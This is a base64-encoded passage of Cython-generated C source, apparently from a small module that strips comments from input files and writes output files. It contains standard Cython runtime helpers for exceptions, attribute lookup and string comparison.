eSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ3csIF9fcHl4X2tfZkFfMlUsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCA4LCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMjQsIDE1M307XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaW5wdXRfZmlsZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb3V0cHV0X2ZpbGUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lucHV0X2YsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NvbnRlbnQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X291dHB1dF9jb250ZW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pbl9jb21tZW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vdXRwdXRfZn07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbnFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JlbW92ZV9jb21tZW50cywgX19weXhfa19RbF9hX1FfQmNfN18yUWFzX1FfQVJxX0NxXzRxX2dRLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgOCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDQ2LCAyMjJ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X25hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3csIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2FfMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYWEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X291dHB1dF9mLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9uYW1lMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbmFtZTJfYmFzZX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbnFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2csIF9fcHl4X2tfQVJ2VV95X2FfVjFfMV9nUWJfYV9RYl9lODFfYXFfZywgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSkpIGdvdG8gYmFkO1xuICB9XG4gIFB5X0RFQ1JFRih0dXBsZV9kZWR1cF9tYXApO1xuICByZXR1cm4gMDtcbiAgYmFkOlxuICBQeV9ERUNSRUYodHVwbGVfZGVkdXBfbWFwKTtcbiAgcmV0dXJuIC0xO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfSW5pdEdsb2JhbHModm9pZCkge1xuICBcbiAgaWYgKGxpa2VseShfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcygpID09IDApKTsgZWxzZVxuXG5pZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbntcbiAgICBQeU9iamVjdCAqdHlwZXNNb2R1bGU9TlVMTDtcbiAgICB0eXBlc01vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgidHlwZXMiKTtcbiAgICBpZiAodHlwZXNNb2R1bGUpIHtcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcodHlwZXNNb2R1bGUsICJNZXRob2RUeXBlIik7XG4gICAgICAgIFB5X0RFQ1JFRih0eXBlc01vZHVsZSk7XG4gICAgfVxufSAvLyBlcnJvciBoYW5kbGluZyBmb2xsb3dzXG4jZW5kaWZcblxuaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG5cbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgcmV0dXJuIC0xO1xufVxuXG5cblxuXG4jaWZkZWYgX01TQ19WRVJcbiNwcmFnbWEgd2FybmluZyggcHVzaCApXG5cbiNwcmFnbWEgd2FybmluZyggZGlzYWJsZSA6IDQxMjcgKVxuI2VuZGlmXG5cblxuXG5cblxuXG5cbiNpZiBDWVRIT05fUkVGTkFOTllcbnN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSkge1xuICAgIFB5T2JqZWN0ICptID0gTlVMTCwgKnAgPSBOVUxMO1xuICAgIHZvaWQgKnIgPSBOVUxMO1xuICAgIG0gPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUobW9kbmFtZSk7XG4gICAgaWYgKCFtKSBnb3RvIGVuZDtcbiAgICBwID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhtLCAiUmVmTmFubnlBUEkiKTtcbiAgICBpZiAoIXApIGdvdG8gZW5kO1xuICAgIHIgPSBQeUxvbmdfQXNWb2lkUHRyKHApO1xuZW5kOlxuICAgIFB5X1hERUNSRUYocCk7XG4gICAgUHlfWERFQ1JFRihtKTtcbiAgICByZXR1cm4gKF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICopcjtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKFB5T2JqZWN0ICpleGNfdHlwZSwgUHlPYmplY3QgKnR1cGxlKSB7XG4gICAgUHlfc3NpemVfdCBpLCBuO1xuICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTtcbiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHtcbiAgICAgICAgaWYgKGV4Y190eXBlID09IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSByZXR1cm4gMTtcbiAgICB9XG4gICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7XG4gICAgICAgIGlmIChfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSkgcmV0dXJuIDE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNJblN0YXRlKFB5VGhyZWFkU3RhdGUqIHRzdGF0ZSwgUHlPYmplY3QqIGVycikge1xuICAgIGludCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKmV4Y190eXBlO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICBQeU9iamVjdCAqY3VycmVudF9leGNlcHRpb24gPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIGlmICh1bmxpa2VseSghY3VycmVudF9leGNlcHRpb24pKSByZXR1cm4gMDtcbiAgICBleGNfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoY3VycmVudF9leGNlcHRpb24pO1xuICAgIGlmIChleGNfdHlwZSA9PSBlcnIpIHJldHVybiAxO1xuI2Vsc2VcbiAgICBleGNfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7XG4gICAgaWYgKGV4Y190eXBlID09IGVycikgcmV0dXJuIDE7XG4gICAgaWYgKHVubGlrZWx5KCFleGNfdHlwZSkpIHJldHVybiAwO1xuI2VuZGlmXG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfSU5DUkVGKGV4Y190eXBlKTtcbiAgICAjZW5kaWZcbiAgICBpZiAodW5saWtlbHkoUHlUdXBsZV9DaGVjayhlcnIpKSkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXhjX3R5cGUsIGVycik7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBlcnIpO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9ERUNSRUYoZXhjX3R5cGUpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuICAgIFB5T2JqZWN0ICp0bXBfdmFsdWU7XG4gICAgYXNzZXJ0KHR5cGUgPT0gTlVMTCB8fCAodmFsdWUgIT0gTlVMTCAmJiB0eXBlID09IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpKSk7XG4gICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgaWYgKHVubGlrZWx5KCgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgdmFsdWUpLT50cmFjZWJhY2sgIT0gdGIpKVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpO1xuICAgIH1cbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSB2YWx1ZTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0eXBlKTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgIHRtcF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IHR5cGU7XG4gICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSB2YWx1ZTtcbiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyckZldGNoSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yikge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICBQeU9iamVjdCogZXhjX3ZhbHVlO1xuICAgIGV4Y192YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247XG4gICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IDA7XG4gICAgKnZhbHVlID0gZXhjX3ZhbHVlO1xuICAgICp0eXBlID0gTlVMTDtcbiAgICAqdGIgPSBOVUxMO1xuICAgIGlmIChleGNfdmFsdWUpIHtcbiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgKnRiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSBleGNfdmFsdWUpLT50cmFjZWJhY2s7XG4gICAgICAgIFB5X1hJTkNSRUYoKnRiKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgKnRiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y192YWx1ZSk7XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiNlbHNlXG4gICAgKnR5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlO1xuICAgICp2YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlO1xuICAgICp0YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gMDtcbiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IDA7XG4gICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gMDtcbiNlbmRpZlxufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSkge1xuICAgIFB5VHlwZU9iamVjdCogdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgaWYgKGxpa2VseSh0cC0+dHBfZ2V0YXR0cm8pKVxuICAgICAgICByZXR1cm4gdHAtPnRwX2dldGF0dHJvKG9iaiwgYXR0cl9uYW1lKTtcbiAgICByZXR1cm4gUHlPYmplY3RfR2V0QXR0cihvYmosIGF0dHJfbmFtZSk7XG59XG4jZW5kaWZcblxuXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbnN0YXRpYyB2b2lkIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJfQ2xlYXJBdHRyaWJ1dGVFcnJvcih2b2lkKSB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBpZiAobGlrZWx5KF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSlcbiAgICAgICAgX19QeXhfUHlFcnJfQ2xlYXIoKTtcbn1cbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICh2b2lkKSBQeU9iamVjdF9HZXRPcHRpb25hbEF0dHIob2JqLCBhdHRyX25hbWUsICZyZXN1bHQpO1xuICAgIHJldHVybiByZXN1bHQ7XG4jZWxzZVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICBQeVR5cGVPYmplY3QqIHRwID0gUHlfVFlQRShvYmopO1xuICAgIGlmIChsaWtlbHkodHAtPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgICAgICByZXR1cm4gX1B5T2JqZWN0X0dlbmVyaWNHZXRBdHRyV2l0aERpY3Qob2JqLCBhdHRyX25hbWUsIE5VTEwsIDEpO1xuICAgIH1cbiNlbmRpZlxuICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBhdHRyX25hbWUpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyX0NsZWFyQXR0cmlidXRlRXJyb3IoKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5hbWUoUHlPYmplY3QgKm5hbWUpIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfYiwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmICFQeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19OYW1lRXJyb3IsXG4gICAgICAgICAgICAibmFtZSBcJyVVXCcgaXMgbm90IGRlZmluZWQiLCBuYW1lKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKlxuX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbilcbntcbiAgICBQeU9iamVjdCAqcmVzO1xuICAgIFB5X3NzaXplX3QgaTtcbiAgICBpZiAobiA8PSAwKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUpO1xuICAgIH1cbiAgICByZXMgPSBQeVR1cGxlX05ldyhuKTtcbiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKHJlcywgaSwgc3JjW2ldKSA8ICgwKSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgUHlfSU5DUkVGKHNyY1tpXSk7XG4gICAgfVxuICAgIHJldHVybiByZXM7XG59XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfY29weV9vYmplY3RfYXJyYXkoUHlPYmplY3QgKmNvbnN0ICpDWVRIT05fUkVTVFJJQ1Qgc3JjLCBQeU9iamVjdCoqIENZVEhPTl9SRVNUUklDVCBkZXN0LCBQeV9zc2l6ZV90IGxlbmd0aCkge1xuICAgIFB5T2JqZWN0ICp2O1xuICAgIFB5X3NzaXplX3QgaTtcbiAgICBmb3IgKGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHtcbiAgICAgICAgdiA9IGRlc3RbaV0gPSBzcmNbaV07XG4gICAgICAgIFB5X0lOQ1JFRih2KTtcbiAgICB9XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqXG5fX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKVxue1xuICAgIFB5T2JqZWN0ICpyZXM7XG4gICAgaWYgKG4gPD0gMCkge1xuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgICB9XG4gICAgcmVzID0gUHlUdXBsZV9OZXcobik7XG4gICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7XG4gICAgX19QeXhfY29weV9vYmplY3RfYXJyYXkoc3JjLCAoKFB5VHVwbGVPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pO1xuICAgIHJldHVybiByZXM7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqXG5fX1B5eF9QeUxpc3RfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pXG57XG4gICAgUHlPYmplY3QgKnJlcztcbiAgICBpZiAobiA8PSAwKSB7XG4gICAgICAgIHJldHVybiBQeUxpc3RfTmV3KDApO1xuICAgIH1cbiAgICByZXMgPSBQeUxpc3RfTmV3KG4pO1xuICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMO1xuICAgIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KHNyYywgKChQeUxpc3RPYmplY3QqKXJlcyktPm9iX2l0ZW0sIG4pO1xuICAgIHJldHVybiByZXM7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlCeXRlc19FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIHx8XFxcbiAgICAgICAgIShDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKVxuICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpO1xuI2Vsc2VcbiAgICBpZiAoczEgPT0gczIpIHtcbiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpO1xuICAgIH0gZWxzZSBpZiAoUHlCeXRlc19DaGVja0V4YWN0KHMxKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMikpIHtcbiAgICAgICAgY29uc3QgY2hhciAqcHMxLCAqcHMyO1xuICAgICAgICBQeV9zc2l6ZV90IGxlbmd0aCA9IFB5Qnl0ZXNfR0VUX1NJWkUoczEpO1xuICAgICAgICBpZiAobGVuZ3RoICE9IFB5Qnl0ZXNfR0VUX1NJWkUoczIpKVxuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuICAgICAgICBwczEgPSBQeUJ5dGVzX0FTX1NUUklORyhzMSk7XG4gICAgICAgIHBzMiA9IFB5Qnl0ZXNfQVNfU1RSSU5HKHMyKTtcbiAgICAgICAgaWYgKHBzMVswXSAhPSBwczJbMF0pIHtcbiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkge1xuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaW50IHJlc3VsdDtcbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTICYmIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQjAwMDApXG4gICAgICAgICAgICBQeV9oYXNoX3QgaGFzaDEsIGhhc2gyO1xuICAgICAgICAgICAgaGFzaDEgPSAoKFB5Qnl0ZXNPYmplY3QqKXMxKS0+b2Jfc2hhc2g7XG4gICAgICAgICAgICBoYXNoMiA9ICgoUHlCeXRlc09iamVjdCopczIpLT5vYl9zaGFzaDtcbiAgICAgICAgICAgIGlmIChoYXNoMSAhPSBoYXNoMiAmJiBoYXNoMSAhPSAtMSAmJiBoYXNoMiAhPSAtMSkge1xuICAgICAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICAgICAgICAgIH1cbiNlbmRpZlxuICAgICAgICAgICAgcmVzdWx0ID0gbWVtY21wKHBzMSwgcHMyLCAoc2l6ZV90KWxlbmd0aCk7XG4gICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTtcbiAgICAgICAgfVxuICAgIH0gZWxzZSBpZiAoKHMxID09IFB5X05vbmUpICYgUHlCeXRlc19DaGVja0V4YWN0KHMyKSkge1xuICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4gICAgfSBlbHNlIGlmICgoczIgPT0gUHlfTm9uZSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczEpKSB7XG4gICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBpbnQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCogcHlfcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmUoczEsIHMyLCBlcXVhbHMpO1xuICAgICAgICBpZiAoIXB5X3Jlc3VsdClcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3Jlc3VsdCk7XG4gICAgICAgIFB5X0RFQ1JFRihweV9yZXN1bHQpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTFxuICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpO1xuI2Vsc2VcbiAgICBpbnQgczFfaXNfdW5pY29kZSwgczJfaXNfdW5pY29kZTtcbiAgICBpZiAoczEgPT0gczIpIHtcbiAgICAgICAgZ290byByZXR1cm5fZXE7XG4gICAgfVxuICAgIHMxX2lzX3VuaWNvZGUgPSBQeVVuaWNvZGVfQ2hlY2tFeGFjdChzMSk7XG4gICAgczJfaXNfdW5pY29kZSA9IFB5VW5pY29kZV9DaGVja0V4YWN0KHMyKTtcbiAgICBpZiAoczFfaXNfdW5pY29kZSAmIHMyX2lzX3VuaWNvZGUpIHtcbiAgICAgICAgUHlfc3NpemVfdCBsZW5ndGgsIGxlbmd0aDI7XG4gICAgICAgIGludCBraW5kO1xuICAgICAgICB2b2lkICpkYXRhMSwgKmRhdGEyO1xuICAgICAgICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShzMSkgPCAwKSB8fCB1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkoczIpIDwgMCkpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBsZW5ndGggPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChzMSk7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8IDApKSByZXR1cm4gLTE7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBsZW5ndGgyID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoczIpO1xuICAgICAgICAjaWYgIUNZVEh